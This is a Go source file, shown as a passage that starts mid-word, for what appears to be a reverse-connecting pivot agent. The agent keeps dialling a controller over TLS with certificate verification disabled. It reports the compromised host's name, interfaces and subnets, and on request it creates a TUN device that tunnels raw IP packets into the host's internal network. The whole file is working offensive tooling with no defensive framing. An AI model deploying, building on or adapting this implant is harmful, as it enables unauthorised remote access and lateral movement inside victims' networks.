ackage main

import (
        "bufio"
        "crypto/tls"
        "flag"
        "fmt"
        "io"
        "log"
        "net"
        "os"
        "os/exec"
        "strings"
        "time"

        "github.com/hashicorp/yamux"
        "github.com/songgao/water"
)

func setupTun(ipAddr string) *water.Interface {
        c := water.Config{
                DeviceType: water.TUN,
        }

        ifce, err := water.New(c)
        if err != nil {
                log.Fatalf("[-] Erro ao criar tun: %v", err)
        }

        exec.Command("ip", "addr", "add", ipAddr, "dev", ifce.Name()).Run()
        exec.Command("ip", "link", "set", "dev", ifce.Name(), "up").Run()

        return ifce
}

func fnGetIfconfig() string {
        interfaces, err := net.Interfaces()
        if err != nil {
                return fmt.Sprintf("Erro ao obter interfaces: %v", err)
        }

        var sb strings.Builder
        for i, iface := range interfaces {
                sb.WriteString(fmt.Sprintf("\nInterface %d\n", i))
                sb.WriteString(fmt.Sprintf("----------------------------------------\n"))
                sb.WriteString(fmt.Sprintf("Name        : %s\n", iface.Name))
                sb.WriteString(fmt.Sprintf("Hardware MAC: %s\n", iface.HardwareAddr.String()))
                sb.WriteString(fmt.Sprintf("MTU         : %d\n", iface.MTU))
                sb.WriteString(fmt.Sprintf("Flags       : %v\n", iface.Flags.String()))

                addrs, err := iface.Addrs()
                if err == nil {
                        for _, addr := range addrs {
                                if strings.Contains(addr.String(), ":") {
                                        sb.WriteString(fmt.Sprintf("IPv6 Address: %s\n", addr.String()))
                                } else {
                                        sb.WriteString(fmt.Sprintf("IPv4 Address: %s\n", addr.String()))
                                }
                        }
                }
        }
        return sb.String()
}

func fnGetRoutes() string {
        interfaces, err := net.Interfaces()
        if err != nil {
                return ""
        }

        var routes []string
        for _, iface := range interfaces {
                if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
                        continue
                }
                addrs, err := iface.Addrs()
                if err != nil {
                        continue
                }
                for _, addr := range addrs {
                        if ipNet, ok := addr.(*net.IPNet); ok {
                                if ipNet.IP.To4() != nil {
                                        routes = append(routes, addr.String())
                                }
                        }
                }
        }
        return strings.Join(routes, ",")
}

func main() {
        connectTarget := flag.String("connect", "127.0.0.1:8080", "Endereço do controlador para se conectar (IP:Porta)")
        flag.Parse()

        tlsConfig := &tls.Config{
                InsecureSkipVerify: true,
        }

        for {
                fmt.Printf("[*] Tentando conectar ao controlador em %s...\n", *connectTarget)
                conn, err := tls.Dial("tcp", *connectTarget, tlsConfig)
                if err != nil {
                        time.Sleep(5 * time.Second)
                        continue
                }

                fmt.Println("[+] Conectado ao controlador! Iniciando sessão...")

                session, err := yamux.Client(conn, nil)
                if err != nil {
                        conn.Close()
                        time.Sleep(5 * time.Second)
                        continue
                }

                ctrlStream, err := session.OpenStream()
                if err != nil {
                        session.Close()
                        conn.Close()
                        time.Sleep(5 * time.Second)
                        continue
                }

                hostname, _ := os.Hostname()
                if hostname == "" {
                        hostname = "target-client"
                }
                ctrlStream.Write([]byte(hostname))

                go func() {
                        reader := bufio.NewReader(ctrlStream)
                        for {
                                cmd, err := reader.ReadString('\n')
                                if err != nil {
                                        break
                                }
                                cmd = strings.TrimSpace(cmd)
                                if cmd == "ifconfig" {
                                        info := fnGetIfconfig()
                                        ctrlStream.Write([]byte(info))
                                } else if cmd == "autoroute" {
                                        routes := fnGetRoutes()
                                        ctrlStream.Write([]byte(routes))
                                }
                        }
                }()

                for {
                        tunStream, err := session.AcceptStream()
                        if err != nil {
                                break
                        }

                        fmt.Println("[+] Túnel L3 iniciado pelo controlador na sessão!")
                        ifce := setupTun("10.10.10.2/24")

                        go func() {
                                buf := make([]byte, 2048)
                                for {
                                        n, err := ifce.Read(buf)
                                        if err != nil {
                                                break
                                        }
                                        if n > 0 {
                                                pktLen := n
                                                lenBuf := []byte{byte(pktLen >> 8), byte(pktLen & 0xff)}
                                                tunStream.Write(lenBuf)
                                                tunStream.Write(buf[:pktLen])
                                        }
                                }
                        }()

                        lenBuf := make([]byte, 2)
                        for {
                                _, err := io.ReadFull(tunStream, lenBuf)
                                if err != nil {
                                        break
                                }
                                pktLen := int(lenBuf[0])<<8 | int(lenBuf[1])
                                if pktLen <= 0 || pktLen > 2000 {
                                        break
                                }
                                pktBuf := make([]byte, pktLen)
                                _, err = io.ReadFull(tunStream, pktBuf)
                                if err != nil {
                                        break
                                }
                                ifce.Write(pktBuf)
                        }
                        ifce.Close()
                        fmt.Println("[-] Túnel L3 encerrado.")
                }

                session.Close()
                conn.Close()
                fmt.Println("[-] Conexão com o controlador perdida. Tentando reconectar em breve...")
                time.Sleep(5 * time.Second)
        }
}
